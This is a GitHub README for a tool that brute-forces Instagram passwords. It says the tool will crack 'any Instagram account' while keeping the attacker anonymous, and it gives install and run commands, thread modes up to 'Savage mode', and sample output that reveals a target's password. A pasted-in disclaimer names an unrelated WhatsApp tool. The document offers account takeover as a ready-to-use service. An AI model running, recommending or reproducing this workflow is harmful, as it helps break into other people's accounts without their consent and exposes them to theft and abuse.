<p align="center"><a><img title="Built With Love" src="http://ForTheBadge.com/images/badges/built-by-developers.svg"> </a>

<p align="center">
	<img src="res/instagram.png" width="600px" hight="100px">
</p>

# <p align="center">instagram-bruteforce

<p align="center">
<a href="https://github.com/bhikandeshmukh"><img title="Open Source" src="https://img.shields.io/badge/Open%20Source-%E2%99%A5-red" ></a>
 <a href="https://github.com/bhikandeshmukh/Termux-Keys"><img title="GitHub version" src="https://d25lcipzij17d.cloudfront.net/badge.svg?id=gh&type=6&v=1.0.0&x2=0" ></a>
 <a href="https://github.com/bhikandeshmukh"><img title="Stars" src="https://img.shields.io/github/stars/bhikandeshmukh/instagram-bruteforce?style=social" ></a>
</p>

# instagram-bruteforce
This program will brute force any Instagram account you send it its way. Just give it a target, a password list and a mode then press enter and forget about it. No need to worry about anonymity when using this program, its highest priority is your anonymity, it only attacks when your identity is hidden.

### NOTICE

I'm no longer maintaining this project. 

## Installing (Tested on Kali Linux, Ubuntu)

### Requirements

,,,

-   Python _v3.x.x_
-   ~~Kali Linux 2.0~~
-   ~~TOR~~

### Install Dependencies

```
pip3 install -r requirements.txt

```
# USE For Linux

```
python3 instagram.py <username> <passwords.lst> 

```
### optional

```
python3 instagram.py <username> <passwords.lst> -m 32 (maximum bot use 32)
```

### Help

```
C:\Users\aladdin\Desktop\Instagram>python3 instagram.py -h
usage: instagram.py [-h] [-m MODE] username wordlist

positional arguments:
  username              email or username
  wordlist              password list

optional arguments:
  -h, --help            show this help message and exit
  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
```

### Usage

```
python3 instagram.py <username> <wordlist> -m <mode>
```

### Bots(Threads)

-   4 bots: 64 passwords at a time
-   8 bots: 128 passwords at a time
-   16 bots: 256 passwords at a time
-   32 bots: 512 passwords at a time

### Modes

-   0: 32 bots
-   1: 16 bots
-   2: 8 bots
-   3: 4 bots

### Chill mode

This mode uses only 4 bots, or 64 passwords at a time.

```
C:\Users\Mohamed\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 3
```

### Moderate mode 1

This mode uses 8 bots, or 128 passwords at a time.

```
C:\Users\Mohamed\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 2
```

### Moderate mode 2

This mode uses 16 bots, or 256 passwords at a time.

```
C:\Users\Mohamed\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 1
```

### Savage mode

This mode uses 32 bots, or 512 passwords at a time.

```
C:\Users\Mohamed\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 0
```

### If you don't specify a mode, then mode is set to 2

### Run

```
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: 272
[-] Complete: 45.51%
[-] Attempts: 228
[-] Browsers: 273
[-] Exists: True
```

### Stop

```
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: Sami123
[-] Complete: 62.67%
[-] Attempts: 314
[-] Browsers: 185
[-] Exists: True

[!] Password Found
[+] Username: Sami09.1
[+] Password: Sami123
```

## Legal Disclaimer:

Usage of WhatsApp-Bulk-Message-Sender for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

<p align="center">
<h4 align="center">♨️ FOLLOW ♨️<h4 align="center">
<a href="https://www.instagram.com/bhikan_deshmukh/"><img title="Instagram" src="https://img.shields.io/badge/instagram-%23E4405F.svg?&style=for-the-badge&logo=instagram&logoColor=white"></a>
<a href="https://wa.me/918600525401"><img title="whatsapp" src="https://img.shields.io/badge/WHATSAPP-%2325D366.svg?&style=for-the-badge&logo=whatsapp&logoColor=white"></a>
<a href="https://www.facebook.com/thebhikandeshmukh"><img title="facebook" src="https://img.shields.io/badge/facebook-%231877F2.svg?&style=for-the-badge&logo=facebook&logoColor=white"></a>
<a href="https://www.twitter.com/bhikan_deshmukh/"><img title="twitter" src="https://img.shields.io/badge/twitter-%231DA1F2.svg?&style=for-the-badge&logo=twitter&logoColor=white"></a>
<a href="https://t.me/dev_aladdin"><img title="Telegram" src="https://img.shields.io/badge/Telegram-blue?style=for-the-badge&logo=Telegram"></a>
<a href="https://rzp.io/l/mrbee"><img title="DONATE" src="https://img.shields.io/badge/DONATE-yellow?style=for-the-badge&logo=google-pay"></a>
<a href="https://blockchain.com/btc/payment_request?address=3FH8UiVVKE5RkCaoaJ9Drr33Dg9L9FtsAq&amount=0.00008703&message=DONATE"><img title="Bitcoin" src="https://img.shields.io/badge/bitcoin-%23000000.svg?&style=for-the-badge&logo=bitcoin&logoColor=white"></a>
</p>  


